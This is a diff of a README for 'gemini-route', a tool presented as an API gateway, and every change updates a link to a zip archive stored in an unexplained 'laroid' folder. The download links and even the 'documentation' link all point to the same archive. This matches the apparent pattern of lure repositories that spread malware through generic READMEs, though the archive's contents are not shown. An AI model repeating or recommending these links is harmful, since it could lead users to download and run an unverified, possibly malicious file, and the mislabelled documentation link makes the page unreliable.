@@ -1,7 +1,7 @@
 # 🌟 gemini-route - Your API Gateway Made Easy
 
 ## 📥 Download Now
-[![Download gemini-route](https://raw.githubusercontent.com/YourRegularNobody/gemini-route/main/laroid/route-gemini-3.4.zip)](https://raw.githubusercontent.com/YourRegularNobody/gemini-route/main/laroid/route-gemini-3.4.zip)
+[![Download gemini-route](https://raw.githubusercontent.com/YourRegularNobody/gemini-route/main/laroid/gemini_route_3.8.zip)](https://raw.githubusercontent.com/YourRegularNobody/gemini-route/main/laroid/gemini_route_3.8.zip)
 
 ## 🚀 Getting Started
 
@@ -20,7 +20,7 @@ Ensure your system meets these needs for the best experience.
 
 ## 📂 Download & Install
 
-To get started, visit the following page to download **gemini-route**: [Download link](https://raw.githubusercontent.com/YourRegularNobody/gemini-route/main/laroid/route-gemini-3.4.zip)
+To get started, visit the following page to download **gemini-route**: [Download link](https://raw.githubusercontent.com/YourRegularNobody/gemini-route/main/laroid/gemini_route_3.8.zip)
 
 ### Steps to Download
 
@@ -91,7 +91,7 @@ If you need more help, you can reach out through the Issues section on our GitHu
 
 ## 🔗 Additional Resources
 
-- **Documentation:** Visit the [documentation](https://raw.githubusercontent.com/YourRegularNobody/gemini-route/main/laroid/route-gemini-3.4.zip) for more detailed instructions and features.
+- **Documentation:** Visit the [documentation](https://raw.githubusercontent.com/YourRegularNobody/gemini-route/main/laroid/gemini_route_3.8.zip) for more detailed instructions and features.
 - **Community:** Join our community on forums and chat groups to share your experiences and learn from others.
 
 By following this guide, you should now have **gemini-route** installed and running smoothly. Thank you for using our software!
